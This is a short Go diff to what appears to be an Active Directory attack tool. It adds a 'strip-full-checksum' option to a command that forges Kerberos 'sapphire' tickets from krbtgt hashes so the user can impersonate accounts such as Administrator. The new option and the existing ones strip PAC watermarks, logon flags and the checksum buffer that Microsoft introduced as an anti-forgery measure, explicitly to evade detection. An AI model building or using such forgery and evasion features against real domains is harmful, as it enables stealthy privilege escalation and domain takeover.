@@ -463,7 +463,7 @@ func cmdSapphire(args []string) error {
 	fs := flag.NewFlagSet("sapphire", flag.ExitOnError)
 	var domainSID, impersonate, krbtgtHash, krbtgtAES, outfile string
 	var userID uint
-	var stripWatermark, stripLogonFlags, stripPACAttributes bool
+	var stripWatermark, stripLogonFlags, stripPACAttributes, stripFullChecksum bool
 
 	fs.StringVar(&domainSID, "domain-sid", "", "Domain SID (S-1-5-21-...)")
 	fs.StringVar(&impersonate, "impersonate", "", "User to impersonate (e.g., Administrator)")
@@ -475,6 +475,7 @@ func cmdSapphire(args []string) error {
 	fs.BoolVar(&stripWatermark, "strip-watermark", false, "Rewrite S-1-18-2 → S-1-18-1 in PAC ExtraSids (evade PAC-watermark detection)")
 	fs.BoolVar(&stripLogonFlags, "strip-logon-flags", false, "Clear LOGON_RESOURCE_GROUPS (0x200) bit in PAC UserFlags (second S4U2Self watermark)")
 	fs.BoolVar(&stripPACAttributes, "strip-pac-attributes", false, "Rewrite PAC_ATTRIBUTES_INFO flags 0x2 (PAC_WAS_GIVEN_IMPLICITLY, S4U2Self) → 0x1 (PAC_WAS_REQUESTED, AS-REQ)")
+	fs.BoolVar(&stripFullChecksum, "strip-full-checksum", false, "Remove PAC_FULL_CHECKSUM buffer (type 19, KB5020805 anti-sapphire measure)")
 	fs.Parse(args)
 
 	// Override global outfile if local one specified
@@ -558,6 +559,7 @@ func cmdSapphire(args []string) error {
 		StripWatermark:     stripWatermark,
 		StripLogonFlags:    stripLogonFlags,
 		StripPACAttributes: stripPACAttributes,
+		StripFullChecksum:  stripFullChecksum,
 	}
 
 	result, err := forge.ForgeSapphireTicket(context.Background(), req)
